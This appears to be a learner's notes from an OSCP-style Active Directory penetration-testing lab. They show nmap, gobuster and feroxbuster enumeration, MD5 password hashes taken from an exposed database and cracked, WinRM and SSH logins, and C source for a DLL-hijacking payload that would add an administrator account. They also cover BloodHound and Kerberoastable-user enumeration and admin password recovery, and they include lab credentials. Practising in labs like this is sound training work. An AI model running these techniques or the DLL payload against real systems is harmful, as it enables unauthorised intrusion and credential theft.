# About this lab

This lab guides learners through an Active Directory exploitation chain, beginning with credential discovery in a SQLite database on an exposed web server. By cracking the credentials, learners gain access to an internal system via WinRM, escalate privileges through binary analysis and pivoting, and extract the domain administrator hash to achieve full domain compromise.

Username: Eric.Wallows
Password: EricLikesRunning800

Hosts:
-  10.10.182.152 - DC01
-  192.168.222.153 - MS01 (OS Credentials `Eric.Wallows / EricLikesRunning800`)
-  10.10.182.154- MS02
---
# Portscan

```bash
TARGET="192.168.222.153"
sudo nmap -v -Pn -p- -T4 -oN "${TARGET}_ports.nmap" "$TARGET" && \
sudo nmap -v -Pn -p $(cat "${TARGET}_ports.nmap" | grep -Eo '([0-9]{1,5})/tcp' | awk -F '/' '{print $1}' | paste -sd ',') -sV -sC -oN "${TARGET}_services.nmap" "$TARGET"
```

UDP:
```bash
sudo nmap -v -Pn -sU -T4 -oN "${TARGET}_udp_ports.nmap" "$TARGET"
```

# WinRM

```bash
evil-winrm -i ms01 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

# HTTP 8000, 47001

8000: IIS default page.
47001: not found

No robots.txt, sitemap.xml, .git

Dir brute:
MS01:
```bash
gobuster dir -u http://ms01.oscp.exam:8000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f
# /aspnet_client/       (Status: 403) [Size: 1233]
# /partner/             (Status: 403) [Size: 1233]
# /error_log/          (Status: 400) [Size: 324]

gobuster dir -u http://ms01.oscp.exam:47001/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f
# /error_log/          (Status: 400) [Size: 324]

gobuster dir -u http://ms01.oscp.exam:8000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x .sqlite,.db
# /.                    (Status: 200) [Size: 696]
# /iisstart.htm         (Status: 200) [Size: 696]

gobuster dir -u http://ms01.oscp.exam:47001/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x .sqlite,.db
# aborted

gobuster dir -u http://ms01.oscp.exam:8000/error_log/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x .sqlite,.db
# nothing

gobuster dir -u http://ms01.oscp.exam:47001/error_log/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x .sqlite,.db
# nothing

gobuster dir -u http://ms01.oscp.exam:8000/aspnet_client/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x .sqlite,.db
# nothing
```
=> nothing => not true MISSED IT!!!! see feroxbuster below

MS02:
```bash
gobuster dir -u http://ms02.oscp.exam:47001/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f
# aborted
```

Feroxbuster mvp:
```bash
feroxbuster -u http://ms01.oscp.exam:8000 -o ms01_p8000.feroxbust

# http://ms01.oscp.exam:8000/partner/db
# http://ms01.oscp.exam:8000/Partner/CHANGELOG
```

DB contains creds:
```json
[
  {
    "desc": "-",
    "id": 1,
    "name": "ecorp",
    "password": "7007296521223107d3445ea0db5a04f9"
  },
  {
    "desc": "support account for internal use",
    "id": 2,
    "name": "support",
    "password": "26231162520c611ccabfb18b5ae4dff2"
  },
  {
    "desc": "-",
    "id": 3,
    "name": "bcorp",
    "password": "e7966b31d1cad8a83f12ecec236c384c"
  },
  {
    "desc": "-",
    "id": 4,
    "name": "acorp",
    "password": "df5fb539ff32f7fde5f3c05d8c8c1a6e"
  }
]
```

CHANGELOG content:
```
Moved partner portal to correct VHOST
```

Hash-identifier thinks these are MD5 hashes.
Cracked with crackstation:
```
7007296521223107d3445ea0db5a04f9:ecorp
26231162520c611ccabfb18b5ae4dff2:Freedom1
```
=> `support:Freedom1`

Check if we can evil-winrm:
```bash
evil-winrm -i ms01 -u 'support' -p 'Freedom1'
```
=> BINGO!!

SSH access is possible too:
```bash
ssh support@ms01
# Freedom1
```

NOTE: The following was in vain!! SSH access made the usage of Admintool.exe clear :/
Skip until HERE :)

---
# DLL Hijacking - Admintool.exe

Path: `C:\Users\support`
```powershell
 .\admintool.exe
# admintool.exe : error: The following required arguments were not provided:

.\admintool.exe test
# Enter administrator password:
# admintool.exe : thread 'main' panicked at 'called `Option::unwrap()` on a `None` value', src/main.rs:75:20
```
=> The program crashes both times, but the second command execution looks like it requests the admin password.

Download to our windows VM and check via Procmon what DLLs it loads.
2 DLLs "userenv.dll" and "CRYPTBASE.dll" are searched in the CWD but not found:
![[Pasted image 20251112211713.png]]

Create DLL to add new admin user:
```C
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        // POC
		// Execute PowerShell cmd
		i = system("powershell.exe -ExecutionPolicy Bypass -Command \"New-Item -ItemType File poc.txt\"");
		
		//i = system ("net user admin69 ComplexPass123! /add");
		//i = system ("net localgroup administrators admin69 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Compile DLL:
```bash
# On Linux
x86_64-w64-mingw32-gcc poc.c --shared -o userenv.dll
x86_64-w64-mingw32-gcc poc.c --shared -o CRYPTBASE.dll

# On Windows
C:\msys64\ucrt64\bin\gcc.exe poc.c -shared -o userenv.dll
C:\msys64\ucrt64\bin\gcc.exe poc.c -shared -o CRYPTBASE.dll
```

Copy to Win VM:
```bash
smbclient \\\\10.0.0.29\\kali_share -U kali%kali -c 'put userenv.dll'
smbclient \\\\10.0.0.29\\kali_share -U kali%kali -c 'put CRYPTBASE.dll'
```

=> Didnt work, there was an error upon DLL loading which prevented the code execution.

# VHOST Fuzzing

```bash
cat vhosts.txt
# ecorp
# support
# bcorp
# acorp

gobuster vhost -u http://192.168.222.153:47001 -w vhosts.txt --domain oscp.exam --ad
```
=> nothing (even without the domain ending option)

---

# SMB

```bash
netexec smb ms01 ms02 dc01 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares

# SMB         192.168.222.153 445    MS01             Share           Permissions     Remark
# SMB         192.168.222.153 445    MS01             -----           -----------     ------
# SMB         192.168.222.153 445    MS01             ADMIN$                          Remote Admin
# SMB         192.168.222.153 445    MS01             C$                              Default share
# SMB         192.168.222.153 445    MS01             IPC$            READ            Remote IPC
# SMB         192.168.222.153 445    MS01             setup           READ            
# SMB         10.10.182.154   445    MS02             [*] Enumerated shares
# SMB         10.10.182.154   445    MS02             Share           Permissions     Remark
# SMB         10.10.182.154   445    MS02             -----           -----------     ------
# SMB         10.10.182.154   445    MS02             ADMIN$                          Remote Admin
# SMB         10.10.182.154   445    MS02             C$                              Default share
# SMB         10.10.182.154   445    MS02             IPC$            READ            Remote IPC
# SMB         10.10.182.152   445    DC01             [*] Enumerated shares
# SMB         10.10.182.152   445    DC01             Share           Permissions     Remark
# SMB         10.10.182.152   445    DC01             -----           -----------     ------
# SMB         10.10.182.152   445    DC01             ADMIN$                          Remote Admin
# SMB         10.10.182.152   445    DC01             C$                              Default share
# SMB         10.10.182.152   445    DC01             IPC$            READ            Remote IPC
# SMB         10.10.182.152   445    DC01             NETLOGON        READ            Logon server share 
# SMB         10.10.182.152   445    DC01             SYSVOL          READ            Logon server share 
# SMB         10.10.182.152   445    DC01             Users           READ
```
=> nothing interesting in setup/IPC$

# Tunneling

Setup ligolo...
Nmap scan MS02, DC01

# BloodHound

Scan:
```bash
sudo bloodhound-ce-python -d "oscp.exam" -ns 10.10.182.152 -u 'Eric.Wallows' -p 'EricLikesRunning800' -c all
```

DA:
tom_admin

Kerberoastable users:
web_svc
sql_svc

No AS-REProastable users.

Default Domain Policy applied:
```
\\OSCP.EXAM\SYSVOL\OSCP.EXAM\POLICIES\{31B2F340-016D-11D2-945F-00C04FB984F9}
```

# AD Enum

Users:
```bash
impacket-GetADUsers -all -dc-ip dc01 'oscp.exam/Eric.Wallows':'EricLikesRunning800' | awk '{print $1}'

# Check for creds in description
netexec ldap dc01 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users
```
=> nope

# MSSQL

```bash
netexec mssql ms01 ms02 dc01 -u 'Eric.Wallows' -p 'EricLikesRunning800'
# MSSQL       10.10.182.154   1433   MS02             [+] oscp.exam\Eric.Wallows:EricLikesRunning800

impacket-mssqlclient 'OSCP/eric.wallows':'EricLikesRunning800'@ms02 -windows-auth
impacket-mssqlclient 'OSCP/eric.wallows':'EricLikesRunning800'@ms02 -windows-auth -port 49700
```
=> nothing 

---
# Skip until HERE

```powershell
.\admintool.exe
# error: The following required arguments were not provided:
#     <CMD>
# 
# USAGE:
#     admintool.exe <CMD>
# 
# For more information try --help
```
=> --help is the same output

Supply argument:
```powershell
.\admintool.exe whoami
# Enter administrator password:
# Freedom1
# thread 'main' panicked at 'assertion failed: `(left == right)`
#   left: `"26231162520c611ccabfb18b5ae4dff2"`,
#  right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', # src/main.rs:78:5
# note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
```
=> Interesting line: `thread 'main' panicked at 'assertion failed: (left == right)

The value for left is the MD5 hash of our password:
```bash
echo -n "Freedom1" | md5sum
# 26231162520c611ccabfb18b5ae4dff2
```

So the value for right is likely the MD5 hash of the admin password.
Cracked the hash via Crackstation: `December31`

The password seems correct but the tool doesn't do anything:
```powershell
.\admintool.exe whoami
# Enter administrator password:
# December31
# Executing command whoami as administrator
```

However SSH access is possible:
```bash
ssh administrator@ms01
# December31
```

TODO: MIMIMI